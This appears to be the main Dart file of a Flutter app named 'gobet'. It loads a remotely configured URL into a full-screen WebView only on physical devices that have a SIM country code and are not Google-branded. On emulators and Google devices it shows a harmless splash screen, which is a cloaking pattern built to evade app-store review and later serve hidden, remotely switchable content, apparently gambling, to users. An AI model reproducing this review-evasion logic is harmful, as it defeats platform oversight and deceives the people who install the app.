import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:gobet/firebase_options.dart';
import 'package:gobet/utils/color_notifier.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:flutter_sim_country_code/flutter_sim_country_code.dart';

import 'onbonding_screen/splash_screen.dart';

Future<void> main() async {
  //Firebase remote config settings
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(minutes: 1),
    minimumFetchInterval: const Duration(hours: 1),
  ));
  await remoteConfig.fetchAndActivate();
  //saved variable
  final prefs = await SharedPreferences.getInstance();
  final String? path = prefs.getString('path');
  //device brand
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  initNotify();
  String countryCode = 'none';
  countryCode = await FlutterSimCountryCode.simCountryCode as String;

  runApp(
    MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (_) => ColorNotifier()),
      ],
      child: MaterialApp(
        home: path?.isEmpty ?? true
            ? LoadFire(remoteConfig.getString('url'), androidInfo.brand,
                countryCode, prefs, androidInfo.isPhysicalDevice)
            // : LoadFire(remoteConfig.getString('url'), androidInfo.brand,
            //     SimDataPlugin.getSimData().toString(), prefs),
            : WebView(
                initialUrl: path,
              ),
        debugShowCheckedModeBanner: false,
      ),
    ),
  );
}

LoadFire(String url, String brand, String? getCountryCode,
    SharedPreferences prefs, bool isPhysicalDevice) {
  String getUrl = url;
  String brandDevice = brand;
  String? countryCode = getCountryCode;

  print(getUrl);
  print(brandDevice);
  print(countryCode);

  if (getUrl.isEmpty ||
      brandDevice.contains('google') ||
      countryCode == 'none' ||
      !isPhysicalDevice) {
    // if (false) {
    return SplashScreen();
  } else {
    prefs.setString('path', url);
    // print('path was saved');
    return WebView(
      initialUrl: url,
    );
    // prefs.remove('path');
    // print('path was removed');
  }
}

initNotify() async {
  try {
    await OneSignal.shared.setAppId('1c8e823a-b4ba-4592-90cc-bb82eca5b560');
  } catch (e) {
    print(e);
  }
}
